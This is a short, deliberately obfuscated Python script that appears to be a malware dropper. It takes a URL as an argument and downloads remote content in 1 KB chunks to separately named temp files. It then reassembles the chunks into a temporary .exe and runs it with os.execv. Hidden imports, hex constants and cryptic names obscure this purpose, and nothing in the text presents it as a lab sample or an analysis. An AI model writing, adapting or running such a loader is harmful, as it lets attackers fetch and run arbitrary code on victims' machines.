def gf(n):
    h = __import__('hashlib').__dict__['sha256']()
    h.update(str(n).encode())
    d = h.hexdigest()[0x0:0xf]
    f = __import__('tempfile').__dict__['NamedTemporaryFile'](delete=False, suffix=f'__{d}')
    return f.name


def lc(u):
    ps = {}
    rr = __import__('requests')
    with rr.get(u, stream=True) as r:
        r.raise_for_status()
        for i, c in enumerate(r.iter_content(chunk_size=0x400), start=0x1):
            if c:
                f = gf(i)
                ps[i] = f
                with open(f, 'wb') as ff:
                    ff.write(c)
    return ps


def rf(ps):
    nf = __import__('tempfile').__dict__['NamedTemporaryFile'](delete=False, suffix='.exe')
    with open(nf.name, 'wb') as fh:
        for p in ps.keys():
            f = ps[p]
            d = open(f, 'rb').read()
            fh.write(d)
    return nf.name


def sp(file_path):
    __import__('os').__dict__['execv'](file_path, ["&"])


def main():
    o = __import__('sys').__dict__['argv']
    if len(o) < 0x2:
        return
    else:
        r = lc(o[0x1])
        nf = rf(r)
        sp(nf)


if __name__ == "__main__":
    main()